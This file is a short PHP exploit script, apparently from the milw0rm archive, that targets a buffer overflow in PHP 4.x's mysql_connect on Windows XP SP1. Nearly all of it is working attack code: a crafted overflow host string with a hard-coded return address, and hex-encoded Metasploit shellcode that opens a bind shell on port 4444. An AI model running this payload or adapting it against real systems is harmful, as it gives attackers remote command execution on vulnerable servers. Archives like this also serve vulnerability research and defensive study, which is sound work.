<?php

/*
This exploit was designed to work with PHP versions 4.3.10 and
4.4.0 under Windows XP SP 1. If another operating system is used,
the replacement EIP must be changed.

The replacement EIP is written 261 bytes into our string. For this
exploit, I used a CALL ESI from ws2_32.dll from Windows XP SP1.

The replacement ESI is simply the base of the PHP image. Locations
after this address will be overwritten with some internal data.

Our shellcode is written into the $user variable. $two is used to
prevent $user from being truncated with a MySQL error message.

Cut from advisory (untested) /str0ke
*/

//Exploit for
//	Apache/1.3.33
//	PHP/4.4.0
//Windows only

$eip = "71AB5651";  //EIP - CALL ESI from Winsock 2.0 ws2_32.dll v5.1.2600.0
$esi = "10000000";  //ESI - Temporary. The memory under this location will be trashed.

//Metasploit win32 bind shell on port 4444
//Thread exit method, no filter
$shellcode = pack("H*","fc6aeb4de8f9ffffff608b6c24248b453c8b7c057801ef8b4f188b5f2001eb498b348b01ee31c099ac84c07407c1ca0d01c2ebf43b54242875e58b5f2401eb668b0c4b8b5f1c01eb032c8b896c241c61c331db648b43308b400c8b701cad8b40085e688e4e0eec50ffd6665366683332687773325f54ffd068cbedfc3b50ffd65f89e56681ed0802556a02ffd068d909f5ad57ffd6535353535343534353ffd06668115c665389e19568a41a70c757ffd66a105155ffd068a4ad2ee957ffd65355ffd068e549864957ffd650545455ffd09368e779c67957ffd655ffd0666a646668636d89e56a505929cc89e76a4489e231c0f3aafe422dfe422c938d7a38ababab6872feb316ff7544ffd65b57525151516a0151515551ffd068add905ce53ffd66affff37ffd08b57fc83c464ffd652ffd068efcee06053ffd6ffd0");

//Endian conversion
$eip = substr($eip, 6, 2) . substr($eip, 4, 2) . substr($eip, 2, 2) . substr($eip, 0, 2);
$esi = substr($esi, 6, 2) . substr($esi, 4, 2) . substr($esi, 2, 2) . substr($esi, 0, 2);

$overflowstring = "localhost:/";
$overflowstring .= "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
$overflowstring .= pack("H*",$eip);	//EIP
$overflowstring .= pack("H*",$esi);	//ESI
$overflowstring .= "/";

//If we don't define this, our shellcode gets truncated
$two = "AAAAAAAAAA";

mysql_connect($overflowstring, $shellcode);

?>

# milw0rm.com [2006-01-05]
